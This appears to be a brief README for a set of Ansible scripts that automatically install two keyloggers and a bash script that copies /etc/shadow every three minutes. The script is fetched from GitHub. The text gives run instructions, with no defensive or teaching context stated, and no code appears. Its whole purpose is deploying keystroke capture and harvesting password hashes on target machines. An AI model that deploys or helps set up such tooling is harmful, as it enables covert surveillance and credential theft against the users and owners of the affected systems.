simply run each of the ansible scripts to automatically install two keyloggers and a bash script that takes a backup of /etc/shadow/ every three mintues.
Run each of the 4 scripts seperately. Copy_shadow.sh does not need to be run but is rather pulled from github and is here just for quick refrence.
